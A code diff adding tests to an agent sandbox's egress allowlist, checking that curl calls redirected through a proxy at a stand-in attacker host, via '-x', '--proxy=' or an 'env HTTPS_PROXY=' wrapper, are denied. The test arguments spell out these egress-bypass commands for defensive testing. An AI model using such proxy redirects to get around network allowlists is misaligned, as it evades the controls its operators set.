@@ -195,6 +195,73 @@ describe("EXEC-HARDENING — a network binary with a PROJECTABLE (allowlisted) h
 });
 
 // ==================================================================================================
+// EGRESS-INTEGRITY (CAP6d) — exec.run cannot REDIRECT a network binary's egress past the host fold via a
+//   proxy flag/env the raw `extractHost` does not see. The proxy DESTINATION now surfaces in networkHosts,
+//   so the deny-by-default egress fold DENIES it (the attacker proxy is not on the allowlist). Closes the
+//   glued `-xhost`, bare `-x host`, and `env *_PROXY=…` wrapper bypasses.
+// ==================================================================================================
+describe("EGRESS-INTEGRITY — exec.run proxy-redirect of a network binary is DENIED (no -x bypass)", () => {
+  it("GLUED `-xhttp://attacker.evil:3128` => DENIED (proxy host gated), effect 0", async () => {
+    const { result, spy } = await driveOneCall(
+      { egressAllow: ["api.allowed.example"] },
+      {
+        name: "exec.run",
+        arguments: {
+          argv: ["curl", "-xhttp://attacker.evil:3128", "https://api.allowed.example/x"],
+        },
+      },
+    );
+    expect(result.isError).toBe(true);
+    expect(spy.execCalls.length).toBe(0);
+  });
+
+  it("BARE `-x attacker` (no dot/scheme) => DENIED (proxy host gated), effect 0", async () => {
+    const { result, spy } = await driveOneCall(
+      { egressAllow: ["api.allowed.example"] },
+      {
+        name: "exec.run",
+        arguments: { argv: ["curl", "-x", "attacker", "https://api.allowed.example/x"] },
+      },
+    );
+    expect(result.isError).toBe(true);
+    expect(spy.execCalls.length).toBe(0);
+  });
+
+  it("`env HTTPS_PROXY=http://attacker.evil:3128 curl …` wrapper => DENIED (proxy host gated), effect 0", async () => {
+    const { result, spy } = await driveOneCall(
+      { egressAllow: ["api.allowed.example"] },
+      {
+        name: "exec.run",
+        arguments: {
+          argv: [
+            "env",
+            "HTTPS_PROXY=http://attacker.evil:3128",
+            "curl",
+            "https://api.allowed.example/x",
+          ],
+        },
+      },
+    );
+    expect(result.isError).toBe(true);
+    expect(spy.execCalls.length).toBe(0);
+  });
+
+  it("`--proxy=http://attacker.evil:3128` => DENIED (proxy host gated), effect 0", async () => {
+    const { result, spy } = await driveOneCall(
+      { egressAllow: ["api.allowed.example"] },
+      {
+        name: "exec.run",
+        arguments: {
+          argv: ["curl", "--proxy=http://attacker.evil:3128", "https://api.allowed.example/x"],
+        },
+      },
+    );
+    expect(result.isError).toBe(true);
+    expect(spy.execCalls.length).toBe(0);
+  });
+});
+
+// ==================================================================================================
 // NO FALSE-POSITIVE (non-network operationClass) — a NON-network command is NOT affected, even if an arg
 //   merely CONTAINS a hostname-like string. echo/cat are not in NETWORK_CMDS => operationClass is not
 //   "network" => the new rule never fires => byte-identical (the effect runs).
